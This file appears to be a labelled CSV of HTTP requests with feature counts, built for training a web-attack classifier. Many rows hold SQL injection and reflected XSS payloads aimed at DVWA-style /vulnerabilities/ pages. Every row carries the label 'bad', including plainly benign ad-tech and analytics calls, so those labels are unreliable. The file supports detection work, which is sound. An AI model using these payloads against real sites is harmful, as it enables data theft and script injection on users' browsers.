method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/gampad/ads?gdfp_req=1&pvsid=4121558502208544&correlator=2852759509739943&output=ldjh&impl=fifs&hxva=1&scor=49798447820530&eid=31061814%2C31060890%2C21067496&vrg=2022020301&ptt=17&sc=1&sfv=1-0-38&ecs=20220209&iu_parts=21783347309%2Cespn.cricinfo.com%2Cseries&enc_prev_ius=0%2F1%2F2&prev_iu_szs=1x1&ists=1&prev_scp=kvps%3Doutofpage%26pos%3Doutofpage&eri=1&cust_params=lang%3Den%26cmssource%3Despn%26darkmode%3Dfalse%26mnr%3Df%26inskin_yes%3Dfalse%26sp%3Dcricinfo%26prof%3Dxl%26ed%3Din%26pgtyp%3Dindex%26kvpt%3Dserieshome%26kvseriesid%3D1195334%26league%3Diccworldtestchampionship20192021%26kvsite%3Diccworldtestchampionship20192021%26swid%3De303a3b9-feb4-498e-b478-1f3b2b6d6405&cookie=ID%3Db88bd47f437aac8a%3AT%3D1644424408%3AS%3DALNI_MauTqi8YYBV-QzweOVa17e2YYIQTg&bc=31&abxe=1&dt=1644424637846&lmt=1644424637&dlt=1644424402409&idt=5018&frm=20&biw=1349&bih=649&oid=2&adxs=0&adys=318&adks=668163853&ucis=9&ifi=9&u_his=1&u_h=768&u_w=1366&u_ah=720&u_aw=1366&u_cd=24&u_sd=1&u_tz=345&flash=0&dmc=8&url=https%3A%2F%2Fwww.espncricinfo.com%2Fseries%2Ficc-world-test-championship-2019-2021-1195334&ref=https%3A%2F%2Fwww.google.com%2F&vis=1&scr_x=0&scr_y=0&psz=1349x0&msz=0x0&ga_vid=2032453128.1644424408&ga_sid=1644424408&ga_hid=1624466241&ga_fc=false&fws=128&ohw=0&btvi=0&uach=WyJXaW5kb3dzIiwiMTQuMC4wIiwieDg2IiwiIiwiOTcuMC40NjkyLjcxIixbXSxudWxsLG51bGwsIjY0IixbXV0.&nvt=1,,0,0,0,0,0,0,bad
GET,/_next/static/chunks/lzutf8.27e7467ee8ebf9bd3683.js,,0,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/?id=%E2%80%98+union+select+null%2Cschema_name+from+information_schema.schemata&Submit=Submit,,0,0,0,0,5,2,bad
GET,/vulnerabilities/sqli/?id=SELECT+First_Name%2CLast_Name+FROM+users+WHERE+ID%3D%E2%80%991%E2%80%B2%3B&Submit=Submit,,0,0,0,0,5,0,bad
GET,/v1/global/fastscore/message/base?messageId=lm-en-1644424586792,,0,0,0,0,0,0,bad
POST,/g/collect?v=2&tid=G-4H06J8XXQH&gtm=2oe270&_p=2111618604&sr=1366x768&ul=en-us&_fid=fpRZVTeujro2SoLDKsx5Ze&cid=456088001.1644424405&_s=2&dl=https%3A%2F%2Fwww.cricbuzz.com%2Fcricket-series%2F3687%2Fwest-indies-tour-of-india-2022&dr=https%3A%2F%2Fwww.cricbuzz.com%2Fcricket-match%2Flive-scores&dt=West%20Indies%20tour%20of%20India%2C%202022%20matches%2C%20scorecards%2C%20preview%2C%20points%20table%2C%20news%2C%20videos%20and%20statistics%20%7C%20Cricbuzz.com&sid=1644424404&sct=1&seg=1&en=user_engagement&_et=13525&ep.origin=firebase,,0,0,0,0,16,1,bad
GET,/vulnerabilities/sqli/?id=%27union+select+%40%40version%23&Submit=Submit,,1,0,0,0,2,2,bad
GET,/a/api/fastlane.json?account_id=13042&site_id=92444&zone_id=435334&size_id=57&rf=https%3A%2F%2Fwww.espncricinfo.com%2Fseries%2Ficc-world-test-championship-2019-2021-1195334&tk_flint=pbjs_lite_v4.30.0&x_source.tid=2cfb6b10-9985-4a4f-a1d1-562f82958f97&p_screen_res=1366x768&rp_secure=1&slots=1&rand=0.5225000087913643,,0,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/?id=1+and+SELECT+First_Name%2CLast_Name+FROM+users+WHERE+ID%3D%E2%80%991%E2%80%B2%3B&Submit=Submit,,0,0,0,0,7,0,bad
GET,/vulnerabilities/sqli/?id=%27union+select++1%2C%40%40version%23&Submit=Submit,,1,0,0,0,3,2,bad
POST,/ut/v3/prebid,,0,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/?id=a%27+or+%27+%27%3D%27&Submit=Submit,,4,0,0,0,3,0,bad
GET,/adsid/integrator.js?domain=www.espncricinfo.com,,0,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/?id=AND+1%3D1+AND+%27%25%27%3D%27&Submit=Submit,,3,0,0,0,3,0,bad
GET,/vulnerabilities/sqli/?id=select+version%28%29&Submit=Submit,,0,0,0,1,1,1,bad
GET,/vulnerabilities/xss_r/?name=%22onclick%3Dprompt%288%29%3E%3Csvg%2Fonload%3Dprompt%288%29%3E%22%40x.y,,0,2,0,2,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx09type%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onMouseEnter+body+onMouseEnter%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onMouseEnter%3E,,0,2,0,1,4,6,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=alert%281%29,,0,0,0,1,0,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx3Etype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%27%60%22%3E%3C%5Cx3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E+,,1,1,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%22-prompt%288%29-%22&user_token=6450e757c172126b48a8c9a3332b5baf,,0,2,0,1,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E,,0,0,0,1,1,1,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fimg%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E,,0,0,0,1,3,1,bad
GET,/vulnerabilities/xss_r/?name=%22onclick%3Dprompt%288%29%3E%22%40x.y,,0,2,0,1,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%2Fonerror%3Dprompt%288%29%3E,,0,0,0,1,1,1,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%2Fsrc%2Fonerror%3Dprompt%288%29%3E,,0,0,0,1,0,1,bad
GET,/index.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cvideo+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fvideo%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx0Dtype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/security.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E,,0,0,0,1,3,1,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fbody%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%27-prompt%288%29-%27&user_token=79bf1185b10533bcbbcc26e7f0d61214,,2,0,0,1,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E,,0,0,0,1,0,1,bad
GET,/vulnerabilities/xss_r/?name=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F&user_token=307a0007301153694cf66962f999c712,,0,1,0,1,0,0,bad
POST,/security.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E,,0,0,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+%5Cx0Aonerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Csvg+onResize+svg+onResize%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fsvg+onResize%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx20type%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx15javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%5Cx0D%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ctitle+onPropertyChange+title+onPropertyChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Ftitle+onPropertyChange%3E,,0,2,0,1,4,6,bad
POST,/login.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%27-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%27&user_token=a88e3a7ab38ed37a393c6112aeb7df6d,,6,2,0,2,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe+onLoad+iframe+onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fiframe+onLoad%3E,,0,2,0,1,4,6,bad
GET,/login.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%22-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%22,,4,4,0,2,0,0,bad
GET,/vulnerabilities/xss_r/?name=%22-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%22&user_token=9035efcad32c69c5abc9e04cea5dce4a,,4,4,0,2,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Caudio+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Faudio%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%27%3Ba%3Dprompt%2Ca%28%29%2F%2F&user_token=be9cc26a0bb663a525656b56f81b9f90,,1,0,0,1,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fscript%3E,,0,2,0,1,3,8,bad
GET,/c/?adExInit=aps&redir=https%3A%2F%2Faax-eu.amazon-adsystem.com/s%2Fecm3%3Fex%3Dsmaato.com%26id%3D%24UID,,0,0,0,0,0,1,bad
GET,/html/html_paragraphs.asp,,0,0,0,0,0,0,bad
GET,/utag/ibm/web/prod/utag.162.js?utv=ut4.46.202112080235,,0,0,0,0,0,0,bad
POST,/unruly_prebid,,0,0,0,0,0,0,bad
POST,/prebid-request,,0,0,0,0,0,0,bad
GET,"/a/api/fastlane.json?account_id=14598&site_id=181004&zone_id=914484&size_id=2&gdpr=0&us_privacy=1---&rp_schain=1.0,1!snigelweb.com,7088,1,,,w3schools.com&eid_criteo.com=945pTl9IVmQ2TkVJY3B1OXF1OUh3Z3VjM0xzN3E0RDBnS0VLRXZOeHpWWlk4VmwlMkZwZjM2Q0hjQTBYU0k3WHZCcW1LWGlHdU8lMkIlMkJpWmFNdmNCbEF1ZlBNYnpHNmpZREVPM2llamkxaEFLYzdydXV0NCUzRA%5E1&eid_id5-sync.com=ID5*aYLrzstJSk0S2Frpe0ilCgPZ8b0ELz0hhDZVS1AXqRMIcDPRt8TdqXTta1wUOQ09CHGkcRLVx9p3UGSHUEKsuAhyixCQp3dON7uvcy_q29AIcyZQZY5ZJKgrtuCqotVlCHQenFPzAR8VzZH6FCJ7DAh1E-r617vazDfWbiKqxSsIduY-z7GrW824u0tRqaNnCHcvcuG75MP94YVQsZqWXgh4Z79r4cKa16buert0HHEIeaPbhIOaVk3F44WoGeyCCHpVhz9dMSKdg76_7VUVJgh7vCWlOdO1R90iT2TbV6AIfIzARZCykaFpb2o01pZiCH1mOYpMGenVyIKO7UC7nwh-Cl0W0v7rUgZu7UnrAcgIfyP3YpfdV1O6wFbMpjU4CIAMTtuPt7f1IvRXYzBfMwiBlsIteFOLrfehJoxtWpgIgoNvEgH9xEGaU9Cem4FqCIMPNycxmtUkCjU48onKEgiEykxIgNSTFHY9BpsWn5sIhZe9JKVaRqCDCSgCw8x3CIYshXV_PhBCNhiP04iX8wiHappzivUMWoT8yseOTYAIiG4KZS2JffnQmUJS7fzVCIkRo61bVCECzYiYwCUtiwiKwnuP6wZe1BFGuJmChgMIqsT6KWgH0Qso6Cr31RKm%5E1%5E2&eid_pubcid.org=7878fc71-24c5-454a-9388-5ac99981a287%5E1&tpid_tdid=02aa9be3-2e1f-4053-99ab-1212ba5d068b&eid_adserver.org=02aa9be3-2e1f-4053-99ab-1212ba5d068b&rf=https%3A%2F%2Fwww.w3schools.com%2Fc%2Fc_operators.php&tk_flint=pbjs_lite_v5.20.2&x_source.tid=301f2fe5-d0be-4e64-a87b-2f9b0c95b6b8&p_screen_res=1366x768&rp_secure=1&rp_hard_floor=0.0566&rp_maxbids=1&slots=1&rand=0.01746944535047157",,0,0,1,0,0,0,bad
GET,/prebid/202202161834/wrap.js,,0,0,0,0,0,0,bad
POST,/unruly_prebid,,0,0,0,0,0,0,bad
GET,/pixel?google_nid=one_tag&google_hm=AAABfxDM_vHKYped-pEI4C7lsJuMIzIu5J17Gg&google_push=AYg5qPK2RkOIn5e7nE4IMmSipeffcFRo0Dt0w7dYCrLlJLAcjYDeRDunSc-5yaSLxJ0WACGDVmFh8pInjBQqPTc76GVn6PR34ttI-0JngRMybhZjASPnjX2_iq6uSZQsfFoimUP01cRE4DCP,,0,0,0,0,0,0,bad
GET,/pcs/view?xai=AKAOjsvL6vv-9Q0uV_qm1MZfNRUg8sys9ISQLoVUKSbRz31O0GCkSlyaudFr0HpeLanfkbSTQKbmoyMk85XVYgjQsVjTegG2VsB72Hdmh16v9oJMqruivfn85wkA6oZWt5oFETZECphtNe_2hvadWfGqh3WlrDCaMfxuFL9yTWueJ8TaS8lHHB_rWdM0qkZpRkgzZPxLngp-TJZohCvna-sM_VxpgAik5e1dgToQyQSxaSLqefne5CeoYTn8gYJbLu1X-0AJfX2likL7T3RfhKUoafCpO9M8p_60MyWze8J0WbPQYwXfZ1BkRizk9J7sxx5phGXVlpRZqGIKmdiJ0zsSn-5dJr0&sig=Cg0ArKJSzLi80LUMToSdEAE&uach_m=[UACH]&adurl=,,0,0,0,0,0,0,bad
GET,"/pagead/gen_204?id=notify&exchange=adx&creative_id=399049200&creative_type=118&usl_id=18274157743&errorcode=400&asseturi=https%3A%2F%2Fr4---sn-h557sn67.c.2mdn.net%2Fvideoplayback%2Fid%2Ff50176f7192beb2b%2Fitag%2F59%2Fsource%2Fweb_video_ads%2Fctier%2FL%2Facao%2Fyes%2Fip%2F0.0.0.0%2Fipbits%2F0%2Fexpire%2F1676790344%2Fsparams%2Facao,ctier,expire,id,ip,ipbits,itag,mh,mip,mm,mn,ms,mv,mvi,pl,source%2Fsignature%2F34570E3109C2A99A1958667F21754C7442676A79.147258724D0DC428E1F4276EBFFB8D0916DAF194%2Fkey%2Fcms1%2Fcms_redirect%2Fyes%2Fmh%2FQY%2Fmip%2F103.174.85.216%2Fmm%2F42%2Fmn%2Fsn-h557sn67%2Fms%2Fonc%2Fmt%2F1645254029%2Fmv%2Fm%2Fmvi%2F4%2Fpl%2F24%2Ffile%2Ffile.mp4&ord=64058594&offset=[CONTENTPLAYHEAD]&d=APEucNUHIcNmBaz35BKySTSejdJKi75OHeH7AQgLkS-Z3AzUi0g3yl5eDkeBwbmB27lVoV3XuWP9uxhRtneoKH-bxZR4VI6nTA",,0,0,1,0,0,0,bad
GET,/sync?pid=167&uid=av-74e193dd-84fe-4055-9a5e-28620add06bc,,0,0,0,0,0,1,bad
POST,/ingress/v1/auction?id=3044744498,,0,0,0,0,0,0,bad
POST,/prebid/v1,,0,0,0,0,0,0,bad
POST,/ut/v3/prebid,,0,0,0,0,0,0,bad
